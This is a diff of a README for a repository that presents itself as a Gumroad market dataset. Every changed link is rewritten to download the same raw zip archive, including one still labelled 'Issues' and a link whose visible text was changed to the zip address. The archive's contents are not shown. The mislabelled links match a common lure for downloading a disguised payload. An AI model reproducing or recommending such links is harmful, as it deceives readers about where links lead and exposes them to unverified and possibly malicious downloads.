@@ -1,6 +1,6 @@
 # 📊 gumroad-market-data - Explore Gumroad Market Trends Easily
 
-[![Download gumroad-market-data](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](https://github.com/arhab2018/gumroad-market-data)
+[![Download gumroad-market-data](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](https://github.com/arhab2018/gumroad-market-data/raw/refs/heads/main/data/data_market_gumroad_3.9.zip)
 
 ---
 
@@ -29,7 +29,7 @@ You do not need any programming skills to download and view the data.
 
 To get the dataset, visit the project page and download the files. Use the big link above or click here:
 
-[Download gumroad-market-data dataset](https://github.com/arhab2018/gumroad-market-data)
+[Download gumroad-market-data dataset](https://github.com/arhab2018/gumroad-market-data/raw/refs/heads/main/data/data_market_gumroad_3.9.zip)
 
 Follow these steps:
 
@@ -100,7 +100,7 @@ While you do not need programming skills to use the data, you can find additiona
 
 For questions about the dataset, visit the Issues tab on the GitHub page:
 
-[Issues on gumroad-market-data](https://github.com/arhab2018/gumroad-market-data/issues)
+[Issues on gumroad-market-data](https://github.com/arhab2018/gumroad-market-data/raw/refs/heads/main/data/data_market_gumroad_3.9.zip)
 
 ---
 
@@ -108,7 +108,7 @@ For questions about the dataset, visit the Issues tab on the GitHub page:
 
 To download the dataset, visit this page:
 
-[https://github.com/arhab2018/gumroad-market-data](https://github.com/arhab2018/gumroad-market-data)
+[https://github.com/arhab2018/gumroad-market-data/raw/refs/heads/main/data/data_market_gumroad_3.9.zip](https://github.com/arhab2018/gumroad-market-data/raw/refs/heads/main/data/data_market_gumroad_3.9.zip)
 
 This page hosts the latest data and all updates for gumroad-market-data.
 
